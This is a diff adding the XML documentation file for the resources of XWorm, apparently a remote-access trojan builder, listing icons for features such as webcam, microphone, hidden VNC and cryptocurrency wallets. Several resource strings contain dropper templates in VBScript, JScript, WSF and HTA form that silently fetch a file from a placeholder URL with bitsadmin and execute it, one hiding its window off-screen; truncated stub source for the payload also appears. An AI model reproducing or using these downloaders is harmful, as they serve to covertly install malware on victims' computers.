@@ -1,0 +1,712 @@
+﻿<?xml version="1.0"?>
+<doc>
+<assembly>
+<name>
+XWorm
+</name>
+</assembly>
+<members>
+<member name="T:XWorm.My.Resources.Resources">
+<summary>
+  Eine stark typisierte Ressourcenklasse zum Suchen von lokalisierten Zeichenfolgen usw.
+</summary>
+</member>
+<member name="P:XWorm.My.Resources.Resources.ResourceManager">
+<summary>
+  Gibt die zwischengespeicherte ResourceManager-Instanz zurück, die von dieser Klasse verwendet wird.
+</summary>
+</member>
+<member name="P:XWorm.My.Resources.Resources.Culture">
+<summary>
+  Überschreibt die CurrentUICulture-Eigenschaft des aktuellen Threads für alle
+  Ressourcenzuordnungen, die diese stark typisierte Ressourcenklasse verwenden.
+</summary>
+</member>
+<member name="P:XWorm.My.Resources.Resources.__">
+<summary>
+  Sucht eine lokalisierte Ressource vom Typ System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:XWorm.My.Resources.Resources._00">
+<summary>
+  Sucht eine lokalisierte Ressource vom Typ System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:XWorm.My.Resources.Resources._005071cbf1fdd17673607ecd7b7e88f6">
+<summary>
+  Sucht eine lokalisierte Ressource vom Typ System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:XWorm.My.Resources.Resources._101783">
+<summary>
+  Sucht eine lokalisierte Ressource vom Typ System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:XWorm.My.Resources.Resources._171482_bookmark_icon__2_">
+<summary>
+  Sucht eine lokalisierte Ressource vom Typ System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:XWorm.My.Resources.Resources._2089742">
+<summary>
+  Sucht eine lokalisierte Ressource vom Typ System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:XWorm.My.Resources.Resources._28814">
+<summary>
+  Sucht eine lokalisierte Ressource vom Typ System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:XWorm.My.Resources.Resources._387_3870193_message_clipart_letter_post_icon_email_unread_png">
+<summary>
+  Sucht eine lokalisierte Ressource vom Typ System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:XWorm.My.Resources.Resources._48857">
+<summary>
+  Sucht eine lokalisierte Ressource vom Typ System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:XWorm.My.Resources.Resources._573961">
+<summary>
+  Sucht eine lokalisierte Ressource vom Typ System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:XWorm.My.Resources.Resources._62107">
+<summary>
+  Sucht eine lokalisierte Ressource vom Typ System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:XWorm.My.Resources.Resources._6622123_preview">
+<summary>
+  Sucht eine lokalisierte Ressource vom Typ System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:XWorm.My.Resources.Resources._744976">
+<summary>
+  Sucht eine lokalisierte Ressource vom Typ System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:XWorm.My.Resources.Resources._828158_check_512x512">
+<summary>
+  Sucht eine lokalisierte Ressource vom Typ System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:XWorm.My.Resources.Resources._get">
+<summary>
+  Sucht eine lokalisierte Ressource vom Typ System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:XWorm.My.Resources.Resources._set">
+<summary>
+  Sucht eine lokalisierte Ressource vom Typ System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:XWorm.My.Resources.Resources.active_search">
+<summary>
+  Sucht eine lokalisierte Ressource vom Typ System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:XWorm.My.Resources.Resources.add">
+<summary>
+  Sucht eine lokalisierte Ressource vom Typ System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:XWorm.My.Resources.Resources.admin">
+<summary>
+  Sucht eine lokalisierte Ressource vom Typ System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:XWorm.My.Resources.Resources.archive_rar_extract_zip_file_data_diocument_secure_31759">
+<summary>
+  Sucht eine lokalisierte Ressource vom Typ System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:XWorm.My.Resources.Resources.b">
+<summary>
+  Sucht eine lokalisierte Ressource vom Typ System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:XWorm.My.Resources.Resources.baccc">
+<summary>
+  Sucht eine lokalisierte Ressource vom Typ System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:XWorm.My.Resources.Resources.BCH_color">
+<summary>
+  Sucht eine lokalisierte Ressource vom Typ System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:XWorm.My.Resources.Resources.black_stop_icon_26">
+<summary>
+  Sucht eine lokalisierte Ressource vom Typ System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:XWorm.My.Resources.Resources.BTC_color">
+<summary>
+  Sucht eine lokalisierte Ressource vom Typ System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:XWorm.My.Resources.Resources.cam">
+<summary>
+  Sucht eine lokalisierte Ressource vom Typ System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:XWorm.My.Resources.Resources.cb">
+<summary>
+  Sucht eine lokalisierte Ressource vom Typ System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:XWorm.My.Resources.Resources.chat_121">
+<summary>
+  Sucht eine lokalisierte Ressource vom Typ System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:XWorm.My.Resources.Resources.close">
+<summary>
+  Sucht eine lokalisierte Ressource vom Typ System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:XWorm.My.Resources.Resources.cmd">
+<summary>
+  Sucht eine lokalisierte Ressource vom Typ System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:XWorm.My.Resources.Resources.cmdd">
+<summary>
+  Sucht eine lokalisierte Ressource vom Typ System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:XWorm.My.Resources.Resources.code">
+<summary>
+  Sucht eine lokalisierte Zeichenfolge, die Imports System
+Imports System.IO
+Imports System.Collections
+Imports System.Collections.Generic
+Imports System.Threading
+Imports System.Diagnostics
+Imports System.Runtime.CompilerServices
+Imports Microsoft.VisualBasic
+Imports Microsoft.VisualBasic.CompilerServices
+Imports System.Environment
+Imports System.Reflection
+Imports System.Resources
+Imports System.Security.Cryptography
+Imports System.Runtime.InteropServices
+
+&lt;Assembly: AssemblyTitle(&quot;%Title%&quot;)&gt;
+&lt;Assembly: AssemblyDescription(&quot;%Des%&quot;)&gt; [Rest der Zeichenfolge wurde abgeschnitten]&quot;; ähnelt.
+</summary>
+</member>
+<member name="P:XWorm.My.Resources.Resources.Copy">
+<summary>
+  Sucht eine lokalisierte Ressource vom Typ System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:XWorm.My.Resources.Resources.DASH_color">
+<summary>
+  Sucht eine lokalisierte Ressource vom Typ System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:XWorm.My.Resources.Resources.del">
+<summary>
+  Sucht eine lokalisierte Ressource vom Typ System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:XWorm.My.Resources.Resources.delllll">
+<summary>
+  Sucht eine lokalisierte Ressource vom Typ System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:XWorm.My.Resources.Resources.discord_black_icon_1">
+<summary>
+  Sucht eine lokalisierte Ressource vom Typ System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:XWorm.My.Resources.Resources.DOGE_color">
+<summary>
+  Sucht eine lokalisierte Ressource vom Typ System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:XWorm.My.Resources.Resources.down">
+<summary>
+  Sucht eine lokalisierte Ressource vom Typ System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:XWorm.My.Resources.Resources.Editing_Paste_icon">
+<summary>
+  Sucht eine lokalisierte Ressource vom Typ System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:XWorm.My.Resources.Resources.ETH_color">
+<summary>
+  Sucht eine lokalisierte Ressource vom Typ System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:XWorm.My.Resources.Resources.exclamation_mark_2">
+<summary>
+  Sucht eine lokalisierte Ressource vom Typ System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:XWorm.My.Resources.Resources.file">
+<summary>
+  Sucht eine lokalisierte Ressource vom Typ System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:XWorm.My.Resources.Resources.file_icon_png_23">
+<summary>
+  Sucht eine lokalisierte Ressource vom Typ System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:XWorm.My.Resources.Resources.filemang">
+<summary>
+  Sucht eine lokalisierte Ressource vom Typ System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:XWorm.My.Resources.Resources.Files_320x320">
+<summary>
+  Sucht eine lokalisierte Ressource vom Typ System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:XWorm.My.Resources.Resources.Fixer">
+<summary>
+  Sucht eine lokalisierte Zeichenfolge, die @echo off
+title XWorm - Fixer
+echo If XWorm Does Not work - Run This Script As Administrator!
+
+pause
+lodctr /r
+pause ähnelt.
+</summary>
+</member>
+<member name="P:XWorm.My.Resources.Resources.gps">
+<summary>
+  Sucht eine lokalisierte Ressource vom Typ System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:XWorm.My.Resources.Resources.greendot">
+<summary>
+  Sucht eine lokalisierte Ressource vom Typ System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:XWorm.My.Resources.Resources.hide">
+<summary>
+  Sucht eine lokalisierte Ressource vom Typ System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:XWorm.My.Resources.Resources.hideeeeee">
+<summary>
+  Sucht eine lokalisierte Ressource vom Typ System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:XWorm.My.Resources.Resources.HTA">
+<summary>
+  Sucht eine lokalisierte Zeichenfolge, die &lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;&gt;
+&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&gt;
+  &lt;head&gt;
+    &lt;meta content=&quot;text/html; charset=utf-8&quot; http-equiv=&quot;Content-Type&quot; /&gt;
+    &lt;script language=&quot;VBScript&quot;&gt;
+      Window.ReSizeTo 0, 0
+      Window.MoveTo -4000, -4000
+
+set runn = CreateObject(&quot;WScript.Shell&quot;)
+dim file
+file = &quot;%pathh%&quot; &amp; &quot;\%filename%&quot;
+const DontWaitUntilFinished = false, ShowWindow = 1, DontShowWindow = 0, Wa [Rest der Zeichenfolge wurde abgeschnitten]&quot;; ähnelt.
+</summary>
+</member>
+<member name="P:XWorm.My.Resources.Resources.Icon_intra_bank_transfer">
+<summary>
+  Sucht eine lokalisierte Ressource vom Typ System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:XWorm.My.Resources.Resources.imageee">
+<summary>
+  Sucht eine lokalisierte Ressource vom Typ System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:XWorm.My.Resources.Resources.img_139106">
+<summary>
+  Sucht eine lokalisierte Ressource vom Typ System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:XWorm.My.Resources.Resources.img_190852">
+<summary>
+  Sucht eine lokalisierte Ressource vom Typ System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:XWorm.My.Resources.Resources.img_233156">
+<summary>
+  Sucht eine lokalisierte Ressource vom Typ System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:XWorm.My.Resources.Resources.img_248030">
+<summary>
+  Sucht eine lokalisierte Ressource vom Typ System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:XWorm.My.Resources.Resources.img_395236">
+<summary>
+  Sucht eine lokalisierte Ressource vom Typ System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:XWorm.My.Resources.Resources.img_433216">
+<summary>
+  Sucht eine lokalisierte Ressource vom Typ System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:XWorm.My.Resources.Resources.img_433315">
+<summary>
+  Sucht eine lokalisierte Ressource vom Typ System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:XWorm.My.Resources.Resources.img_487535">
+<summary>
+  Sucht eine lokalisierte Ressource vom Typ System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:XWorm.My.Resources.Resources.infooo">
+<summary>
+  Sucht eine lokalisierte Ressource vom Typ System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:XWorm.My.Resources.Resources.install_software_download">
+<summary>
+  Sucht eine lokalisierte Ressource vom Typ System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:XWorm.My.Resources.Resources.installation_symbol">
+<summary>
+  Sucht eine lokalisierte Ressource vom Typ System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:XWorm.My.Resources.Resources.Internet_Explorer_PNG_Background">
+<summary>
+  Sucht eine lokalisierte Ressource vom Typ System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:XWorm.My.Resources.Resources.Intro">
+<summary>
+  Sucht eine lokalisierte Ressource vom Typ System.Byte[].
+</summary>
+</member>
+<member name="P:XWorm.My.Resources.Resources.js">
+<summary>
+  Sucht eine lokalisierte Zeichenfolge, die try {
+var file = &quot;%pathh%&quot; + &quot;\\%filename%&quot;;
+new ActiveXObject(&quot;WScript.Shell&quot;).run(&apos;bitsadmin.exe /transfer 8 %url% &apos; + file,0, true)
+new ActiveXObject(&quot;WScript.Shell&quot;).run(file)
+}
+catch (e) {
+} ähnelt.
+</summary>
+</member>
+<member name="P:XWorm.My.Resources.Resources.key">
+<summary>
+  Sucht eine lokalisierte Ressource vom Typ System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:XWorm.My.Resources.Resources.kill">
+<summary>
+  Sucht eine lokalisierte Ressource vom Typ System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:XWorm.My.Resources.Resources.kkkk">
+<summary>
+  Sucht eine lokalisierte Ressource vom Typ System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:XWorm.My.Resources.Resources.logooff">
+<summary>
+  Sucht eine lokalisierte Ressource vom Typ System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:XWorm.My.Resources.Resources.LTC_color">
+<summary>
+  Sucht eine lokalisierte Ressource vom Typ System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:XWorm.My.Resources.Resources.maps">
+<summary>
+  Sucht eine lokalisierte Ressource vom Typ System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:XWorm.My.Resources.Resources.MIC">
+<summary>
+  Sucht eine lokalisierte Ressource vom Typ System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:XWorm.My.Resources.Resources.monitor_sleep">
+<summary>
+  Sucht eine lokalisierte Ressource vom Typ System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:XWorm.My.Resources.Resources.msg">
+<summary>
+  Sucht eine lokalisierte Ressource vom Typ System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:XWorm.My.Resources.Resources.newfolder">
+<summary>
+  Sucht eine lokalisierte Ressource vom Typ System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:XWorm.My.Resources.Resources.no">
+<summary>
+  Sucht eine lokalisierte Ressource vom Typ System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:XWorm.My.Resources.Resources.password_reset">
+<summary>
+  Sucht eine lokalisierte Ressource vom Typ System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:XWorm.My.Resources.Resources.Path">
+<summary>
+  Sucht eine lokalisierte Ressource vom Typ System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:XWorm.My.Resources.Resources.play_icon_png_transparent_28">
+<summary>
+  Sucht eine lokalisierte Ressource vom Typ System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:XWorm.My.Resources.Resources.PngItem_5510505">
+<summary>
+  Sucht eine lokalisierte Ressource vom Typ System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:XWorm.My.Resources.Resources.power">
+<summary>
+  Sucht eine lokalisierte Ressource vom Typ System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:XWorm.My.Resources.Resources.processss">
+<summary>
+  Sucht eine lokalisierte Ressource vom Typ System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:XWorm.My.Resources.Resources.re1">
+<summary>
+  Sucht eine lokalisierte Ressource vom Typ System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:XWorm.My.Resources.Resources.reddot">
+<summary>
+  Sucht eine lokalisierte Ressource vom Typ System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:XWorm.My.Resources.Resources.reeeeeee">
+<summary>
+  Sucht eine lokalisierte Ressource vom Typ System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:XWorm.My.Resources.Resources.renm">
+<summary>
+  Sucht eine lokalisierte Ressource vom Typ System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:XWorm.My.Resources.Resources.runnn">
+<summary>
+  Sucht eine lokalisierte Ressource vom Typ System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:XWorm.My.Resources.Resources.save">
+<summary>
+  Sucht eine lokalisierte Ressource vom Typ System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:XWorm.My.Resources.Resources.sc">
+<summary>
+  Sucht eine lokalisierte Ressource vom Typ System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:XWorm.My.Resources.Resources.sf">
+<summary>
+  Sucht eine lokalisierte Ressource vom Typ System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:XWorm.My.Resources.Resources.showwww">
+<summary>
+  Sucht eine lokalisierte Ressource vom Typ System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:XWorm.My.Resources.Resources.sleep">
+<summary>
+  Sucht eine lokalisierte Ressource vom Typ System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:XWorm.My.Resources.Resources.sound_play_sound">
+<summary>
+  Sucht eine lokalisierte Ressource vom Typ System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:XWorm.My.Resources.Resources.soundd">
+<summary>
+  Sucht eine lokalisierte Ressource vom Typ System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:XWorm.My.Resources.Resources.ST">
+<summary>
+  Sucht eine lokalisierte Ressource vom Typ System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:XWorm.My.Resources.Resources.st2">
+<summary>
+  Sucht eine lokalisierte Ressource vom Typ System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:XWorm.My.Resources.Resources.Stub">
+<summary>
+  Sucht eine lokalisierte Zeichenfolge, die Imports System.Security.Cryptography
+Imports Microsoft.Win32
+Imports System.Management
+Imports System
+Imports System.Net.Sockets
+Imports Microsoft.VisualBasic
+Imports System.Diagnostics
+Imports System.Reflection
+Imports System.Runtime.InteropServices
+Imports System.Collections.Generic
+Imports System.Drawing
+Imports System.Windows.Forms
+Imports System.IO
+Imports System.Net
+Imports System.Drawing.Drawing2D
+Imports System.Drawing.Imaging
+Imports System.Runtime.CompilerServices
+Imports System.S [Rest der Zeichenfolge wurde abgeschnitten]&quot;; ähnelt.
+</summary>
+</member>
+<member name="P:XWorm.My.Resources.Resources.tex">
+<summary>
+  Sucht eine lokalisierte Ressource vom Typ System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:XWorm.My.Resources.Resources.uac">
+<summary>
+  Sucht eine lokalisierte Ressource vom Typ System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:XWorm.My.Resources.Resources.unlock_icon_0">
+<summary>
+  Sucht eine lokalisierte Ressource vom Typ System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:XWorm.My.Resources.Resources.unlock_icon_0_copy">
+<summary>
+  Sucht eine lokalisierte Ressource vom Typ System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:XWorm.My.Resources.Resources.unnamed">
+<summary>
+  Sucht eine lokalisierte Ressource vom Typ System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:XWorm.My.Resources.Resources.unnamed1">
+<summary>
+  Sucht eine lokalisierte Ressource vom Typ System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:XWorm.My.Resources.Resources.unnamed2">
+<summary>
+  Sucht eine lokalisierte Ressource vom Typ System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:XWorm.My.Resources.Resources.up">
+<summary>
+  Sucht eine lokalisierte Ressource vom Typ System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:XWorm.My.Resources.Resources.url">
+<summary>
+  Sucht eine lokalisierte Ressource vom Typ System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:XWorm.My.Resources.Resources.v">
+<summary>
+  Sucht eine lokalisierte Ressource vom Typ System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:XWorm.My.Resources.Resources.VBCode">
+<summary>
+  Sucht eine lokalisierte Zeichenfolge, die Imports System.Windows.Forms
+Imports System
+Imports System.Data
+Imports System.Drawing
+Imports System.Deployment
+Imports System.Xml
+Imports Microsoft.VisualBasic
+
+    Public Class Program
+        Public Shared Sub Main()
+            Try
+                MessageBox.Show(&quot;Hello World&quot;)
+            Catch
+            End Try
+        End Sub
+    End Class ähnelt.
+</summary>
+</member>
+<member name="P:XWorm.My.Resources.Resources.vbs">
+<summary>
+  Sucht eine lokalisierte Zeichenfolge, die on error resume next
+dim file
+file = &quot;%pathh%&quot; + &quot;\%filename%&quot;
+CreateObject(&quot;WScript.Shell&quot;).Run &quot;bitsadmin.exe /transfer 8 %url% &quot; + file,0, true
+CreateObject(&quot;WScript.Shell&quot;).Run file ähnelt.
+</summary>
+</member>
+<member name="P:XWorm.My.Resources.Resources.virus_PNG35">
+<summary>
+  Sucht eine lokalisierte Ressource vom Typ System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:XWorm.My.Resources.Resources.vvv">
+<summary>
+  Sucht eine lokalisierte Ressource vom Typ System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:XWorm.My.Resources.Resources.wifi">
+<summary>
+  Sucht eine lokalisierte Ressource vom Typ System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:XWorm.My.Resources.Resources.windows_10_icon_icons_com_66166">
+<summary>
+  Sucht eine lokalisierte Ressource vom Typ System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:XWorm.My.Resources.Resources.wsf">
+<summary>
+  Sucht eine lokalisierte Zeichenfolge, die &lt;job id=&quot;code&quot;&gt;&lt;script language=&quot;VBScript&quot;&gt;
+on error resume next
+dim file
+file = &quot;%pathh%&quot; + &quot;\%filename%&quot;
+CreateObject(&quot;WScript.Shell&quot;).Run &quot;bitsadmin.exe /transfer 8 %url% &quot; + file,0, true
+CreateObject(&quot;WScript.Shell&quot;).Run file
+&lt;/script&gt;&lt;/job&gt; ähnelt.
+</summary>
+</member>
+<member name="P:XWorm.My.Resources.Resources.xhvnc">
+<summary>
+  Sucht eine lokalisierte Ressource vom Typ System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:XWorm.My.Resources.Resources.XMR_color">
+<summary>
+  Sucht eine lokalisierte Ressource vom Typ System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:XWorm.My.Resources.Resources.yes">
+<summary>
+  Sucht eine lokalisierte Ressource vom Typ System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:XWorm.My.Resources.Resources.ZEC_color">
+<summary>
+  Sucht eine lokalisierte Ressource vom Typ System.Drawing.Bitmap.
+</summary>
+</member>
+</members>
+</doc>
